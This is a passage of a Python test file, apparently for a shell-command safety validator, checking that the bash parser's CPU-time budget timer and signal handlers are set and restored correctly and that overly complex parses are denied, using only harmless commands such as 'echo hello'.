        assert validate_command("echo fresh budget").allowed

    def test_timer_and_handler_are_restored(self, runaway_parse):
        before = signal.getsignal(signal.SIGVTALRM)
        with pytest.raises(ParseBudgetError):
            parser_mod.BashCommandParser().parse("echo hello")
        assert signal.getitimer(signal.ITIMER_VIRTUAL) == (0.0, 0.0)
        assert signal.getsignal(signal.SIGVTALRM) is before
        # The caller's own SIGALRM deadline (the guard fixture's) is still armed.
        assert signal.getitimer(signal.ITIMER_REAL)[0] > 0

    def test_a_callers_virtual_timer_is_put_back(self, parser):
        previous = signal.signal(signal.SIGVTALRM, signal.SIG_IGN)
        try:
            signal.setitimer(signal.ITIMER_VIRTUAL, 100)
            parser.parse("echo hello")
            assert signal.getitimer(signal.ITIMER_VIRTUAL)[0] > 99
            assert signal.getsignal(signal.SIGVTALRM) is signal.SIG_IGN
        finally:
            signal.setitimer(signal.ITIMER_VIRTUAL, 0)
            signal.signal(signal.SIGVTALRM, previous)

    def test_timer_is_disarmed_after_a_normal_parse(self, parser):
        parser.parse("echo hello")
        assert signal.getitimer(signal.ITIMER_VIRTUAL) == (0.0, 0.0)

    def test_validate_command_denies_a_runaway_parse(self, runaway_parse, no_shellcheck):
        """Denied outright: the word "heredoc" must not route it to the heredoc fallback, which re-parses."""
        result = validate_command("cat <<heredoc\nbudget test\nheredoc")
        assert not result.allowed
        assert result.risk_level.name == "BLOCKED"
        assert "too complex to analyse" in result.message

    def test_commit_filter_falls_back_under_a_runaway_parse(self, runaway_parse):
        result = CommitMessageFilter({"enabled": True, "rules": {}}).filter_commit_message('git commit -m "budget test"')
        assert (result.original_message, result.was_modified, result.error) == ("budget test", False, None)

    def test_parse_off_the_main_thread_still_works(self, parser):
        """Python runs signal handlers only on the main thread, so a worker thread parses unbounded rather than failing."""
        out = []
        worker = threading.Thread(target=lambda: out.append(parser.parse("echo hello")))
        worker.start()
        worker.join()
        assert out and out[0]
